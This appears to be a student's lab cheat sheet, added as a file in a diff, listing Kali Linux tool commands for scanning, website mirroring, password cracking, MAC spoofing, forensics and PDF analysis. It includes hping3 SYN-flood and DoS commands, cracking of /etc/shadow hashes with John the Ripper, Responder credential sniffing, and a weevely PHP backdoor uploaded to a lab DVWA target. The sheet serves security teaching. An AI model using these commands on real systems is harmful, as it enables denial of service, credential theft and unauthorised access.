@@ -1,0 +1,192 @@
+1) a nmap
+sudo apt install nmap
+nmap <ip_address>-To find open ports on host
+nmap -sL <network>-To find Live hosts on a network
+nmap -sn <network>-To find and ping all Live hosts on a network
+nmap -sV <ip_address>-To find services listening on ports on hosts( serviceVersion gusses versions of services running)
+nmap -O <ip_address>-serviceVersion gives versions of services running
+nmap –p <port numbers or names> <IP or domain>: Scans specified ports of given IP
+nmap –A <domainname>: Aggressive scan, info like traceroute, open ports, verions etc.
+ping <ip_address>:  The ping command is used to test the ability of the source computer to reach a specified destination computer.
+nmap –traceroute <IP or Domain>: Full route to reach the IP
+
+b hping
+sudo apt install hping3
+sudo hping3 -S <ip_address> -p <port> -c <number_of_packets>-Port Scanning
+sudo hping3 --traceroute -V -1 <ip_address>-Traceroute using Hping3
+sudo hping3 -a <FAKE IP> <target> -S -q -p 80 --faster- Perform A TCP Syn Flood Attack With Kali Linux & Hping3
+hping3 <ip_addr> –-data <data size>
+DoS Attack: hping3 <ip_addr>  –flood –rand-source –data 10000
+hping3 –scan <port range> <ip_addr> -S (S flag is to set syn flag or else output wont be in proper format)
+hping3 <ip_addr> -p <port_no> -S –tcp-timestamp: When timestamp added, router may consider it to be important
+hping3 <ip_addr> -c <no of packets>
+
+
+
+2)a not there
+
+b httrack
+sudo apt-get install httrack webhttrack
+httrack https://www.rvce.edu.in/-To mirror a site
+webhttrack-gui
+httrack-To bring to an interactive mode
+httrack --continue-To continue a mirror in the current folder
+httrack --update-To update a mirror in the current folder
+To mirror two sites together (with shared links) and accept any .jpg files on .com sites
+Syntax - httrack <site1_URL> <site2_URL> +<mime:MIME_filter> -<mime:MIME_filter>
+httrack www.someweb.com/bob/ www.anothertest.com/mike/ +*.com/*.jpg
+-mime:application/*
+To run on spider using a proxy
+Syntax - httrack <site_URL> --spider -P <proxy_link>
+httrack www.someweb.com/bob/bobby.html --spider -P proxy.myhost.com:8080
+To get all files starting from bobby.html, with 6 link-depth, and possibility of going
+everywhere on the web,Command - httrack www.someweb.com/bob/bobby.html +* -r6
+
+
+
+3)a
+john the ripper
+sudo apt install john
+John –list=formats: gives list of encryption types supported
+John b1.txt –-format=RAW-MD5 or SHA1: breaks all the hash codes in the given file generated usin md5 to give corresponding unhashed texts
+John the ripper Single crack mode-Syntax: john [mode/option] [password file]
+john --single --format=raw-sha1 file.txt(username required)
+John the ripper Wordlist crack mode-Syntax: john [wordlist] [options] [password file]
+john --wordlist=/usr/share/john/password.lst --format=raw-sha1 file.tx
+Incremental modeSyntax: john --incremental [password file]
+john --incremental crack.txt
+john --rules=ShiftToggle -wordlist=wordlist.txt --stdout | more :list of names to be given and different ways output is printed
+sudo unshadow /etc/passwd /etc/shadow : unshadows the password file to make work easier
+john shadow.txt --wordlist=/usr/share/john/password.lst: copy one of the user data in shadow.txt file and provide a wordlist
+john --show shadow.txt: shows unhashed userdata
+Creating a new user
+sudo useradd -r <name>
+sudo passwd <name>
+Cracking multiple files
+Syntax: john [file1] [file2]
+john -form=raw-md5 file1.txt file2.txt
+
+
+b crunch 
+john -form=raw-md5 file1.txt file2.txt
+To check the installation.,type "crunch"
+To create a word list of specific numbers-crunch 1 2 0123456789 
+To save the wordlist into a file -crunch 1 2 0123456789 >wordlist.txt  
+To a file with -o option  -crunch  1 2 0123456789 -o wordlist.txt
+To generate a wordlist with a permutation of some strings or characters -crunch 1 10 -p Hello Manav
+To generate a wordlist with a specific pattern-crunch 10 10 -t manav^%%%%
+, for all uppercase letters
+@ for all lowercase letters
+% for all numeric characters
+^ for all special characters
+to generate required passwords-Crunch min max -t <pattern> -l <define which symbol to be literal> (variables like,@%^can be made constant by typing same thing in l in same position
+
+
+
+4a Macchanger
+sudo apt install macchanger
+take down the network adapter in order to change the MAC address. To turn off network interface, Command - ifconfig eth0 down
+To show summary of options (-h --help)
+To change MAC address (-m --mac)
+Syntax - macchanger -m <new_MAC_address> eth0
+To set a fully random MAC address (-r --random)
+Command - macchanger -r eth0
+To not change the vendor bytes ie., first 6 bits,next 6 are network interface(-e --ending)
+Command - macchanger -e eth0
+To reset MAC address to its original, permanent hardware value (-p --permanent)
+Command - macchanger -p eth0
+To bring up the network interface
+Command - ifconfig eth0 up
+-a:set random mac address of same kind
+-A:set random mac address of any kind
+-l:lists all vendors
+
+b Responder
+sudo apt install responder
+first change settings from  NAT to Bridge Adapter in network
+ifconfig
+responder -I eth0
+192.168.0.5 in windows
+All of the sniffed information is stored in the log file which is present in the following directory - “/usr/share/responder/logs”
+to decrypt-john HTTP-NTLMV one file
+
+
+
+
+5a weevely
+sudo apt install weevely
+Generate the backdoor agent-weevely generate passwordoffile .php file
+open metaexploit msfadmin,msfadmin
+open 192.168.79.129(metasploit ip address) -> dvwa seurity low
+upload the downloaded script
+go to weevely “http://192.168.79.129/dvwa/hackable/uploads/attack.php” password in terminal
+now u can access remove-file_rm filename,upload file_upload filename,“system_info”
+
+
+
+
+b proxychains
+sudo apt-get install tor and sudo apt-get install proxychains
+sudo service tor start -to start
+sudo service tor status-to check
+sudo mousepad /etc/proxychains4.conf-change to dynamic link and add sock5 
+proxychains4 firefox google.com
+
+6)a foremost
+Connect your usb device to your laptop/desktop
+Select Devices->USB->JetFlash Mass Storage Device to connect the usb to kali machine
+To know the path of the USB device, use the command
+# fdisk -l
+Copy the path of the USB disk - /dev/sdb1
+foremost -v -q -t all -i /dev/sdb1 -o recoveredFiles
+
+b Binwalk
+binwalk -B filename:Signature analysis
+binwalk -e filename:extract files of firmware image
+binwalk -Me filename:(recursive scan and also additional detials)extract files of firmware image
+binwalk -D 'png image:png' 10th.apk-scan image for specific type
+binwalk -Mre filename-extract undetected files recursively
+binwalk -I filename:Shows results for invalid
+binwalk -y 'filesystem'  10th.apk-number of matching type found
+binwalk -E filename-entropy,low means weak encryption,high means strong encryption
+
+
+7)a pipal
+sudo apt install pipal
+pipal -h
+pipal -t 10 passwords.txt-show analysis
+To store the output in another file (-o or --output)
+pipal -t 10 -0 s.txt passwords.txt
+To show the available checker which are enabled ( --list-checkers)
+pipal --list-checkers
+enable color checker-sudo ln -s /usr/share/pipal/checkers_enabled/color_checker.rb
+
+
+b cutycapt 
+sudo apt install cutycapt
+cutycapt -h
+cutycapt --url=http://www.exampl e.org/ --out=localfile.png
+--zoom-factor
+--min-width
+
+8)a netdiscover
+first change from nat to bridge adapter
+netdiscover -h
+netdicover-to see live hosts on network
+sudo netdiscover -r 192.168.1.1/24-scan a given range
+sudo netdiscover -l netdiscover.txt-from a file.in file save some ip address
+-s no-to speify milli sec gap between each arp request
+sudo netdiscover -r 192.168.1.0/24 -PN-prints next line(p-easily parsable by another prgrm),without headers(n)
+sudo netdiscover -r 192.168.1.0/24 -p:(small p)used to do passive mode scan: do not send anything, only sniff lot of patience
+
+
+b pdfparser
+pdf-parser -h-help
+pdf-parser -m-prints manual of available tools
+pdf-parser pdfname-details about pdf
+pdf-parser  -H itg.pdf-display hash of objects
+pdf-parser  -v itg.pdf-display malformed PDF elements
+pdf-parser  -a itg.pdf-stats of the pdf
+df-parser  -g itg.pdf-generate a Python program that creates the parsed PDF file
+
+
